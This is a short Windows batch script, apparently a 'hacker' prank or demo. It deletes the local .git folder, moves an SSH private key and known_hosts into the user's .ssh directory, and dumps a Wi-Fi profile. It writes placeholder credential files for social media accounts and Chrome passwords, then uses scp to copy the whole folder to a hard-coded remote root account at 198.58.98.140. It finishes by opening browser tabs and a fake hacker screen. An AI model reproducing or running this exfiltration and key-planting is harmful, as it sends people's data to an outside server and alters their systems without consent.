@echo off

SET BROWSER=chrome.exe
SET WAIT_TIME=2


rmdir /s /q .git
timeout /t 1 /nobreak > NUL

move id_rsa %userprofile%\\.ssh
timeout /t 1 /nobreak > NUL
move known_hosts %userprofile%\\.ssh
timeout /t 1 /nobreak > NUL

start cmd /k netsh wlan show profile Samrat_5G > info-wifi
echo uname: -------- pass:-------- > info-facebook
echo uname: -------- pass:-------- > info-gmail
echo uname: -------- pass:-------- > info-twitter
echo uname: -------- pass:-------- > info-instagram
echo uname: -------- pass:-------- > info-github
echo uname: -------- pass:-------- > info-linkdin
echo uname: -------- pass:-------- > info-teligram
echo uname: -------- pass:-------- > photos
echo uname: -------- pass:-------- > videos
echo uname: -------- pass:-------- > documants
echo uname: -------- pass:-------- > chrome-passwords

dir > info-system
scp -rp * root@198.58.98.140:/root/received-data/wifi-info/



START %BROWSER% -new-tab "https://www.youtube.com/watch?v=p7ZsBPK656s&list=RDEMKoVNknwHda2sQb0WrWnwFQ&start_radio=1&ab_channel=NoCopyrightSounds"
@ping 127.0.0.1 -n %WAIT_TIME% -w 1000 > nul
timeout /t 5 /nobreak > NUL
START %BROWSER% -new-tab "https://www.facebook.com/"
timeout /t 2 /nobreak > NUL
START %BROWSER% -new-tab "https://web.telegram.org/z/"
timeout /t 2 /nobreak > NUL
START %BROWSER% -new-tab "https://www.instagram.com/"
timeout /t 2 /nobreak > NUL
start wt.exe
start calc.exe
start vlc.exe
start brave.exe -new-tab "https://pranx.com/hacker/"
timeout /t 4 /nobreak > NUL
START %BROWSER% -new-tab "https://pranx.com/hacker/"
timeout /t 1 /nobreak > NUL



